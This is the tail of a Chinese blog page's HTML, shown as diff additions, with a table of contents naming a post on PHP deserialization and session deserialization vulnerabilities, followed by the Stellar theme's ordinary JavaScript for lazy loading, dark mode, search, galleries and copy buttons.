+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E"><span class="toc-text">常规漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WAKEUP"><span class="toc-text">__WAKEUP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DESTRUCT"><span class="toc-text">__DESTRUCT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%B8%ADSESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-text">PHP中SESSION反序列化（重点）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">简介与基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SESSION%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">SESSION序列化漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-SESSION%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%B1%E5%AE%B3"><span class="toc-text">PHP SESSION中的序列化危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-text">实际利用</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://img.api.aa1.cn/2025/01/01/a02099351de5a.jpg`,
+    cover: ``,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div><!-- hexo injector body_end start -->
+<script>
+  // JS Kill Switch: Remove any remaining background images in widgets
+  document.addEventListener("DOMContentLoaded", function() {
+    // 1. Target obvious cover classes
+    const covers = document.querySelectorAll('.widget-wrapper .cover, .widget-wrapper .widget-header, .layout-author .cover');
+    covers.forEach(el => {
+      el.style.backgroundImage = 'none';
+      el.style.background = 'transparent';
+    });
+    
+    // 2. Target ANY div inside a widget that has a background-image inline style
+    const allDivs = document.querySelectorAll('.widget-wrapper div');
+    allDivs.forEach(el => {
+      if (el.style.backgroundImage && el.style.backgroundImage !== 'none') {
+        el.style.backgroundImage = 'none';
+        el.style.background = 'transparent';
+      }
+    });
+  });
+</script>
+<!-- hexo injector body_end end --></body></html>
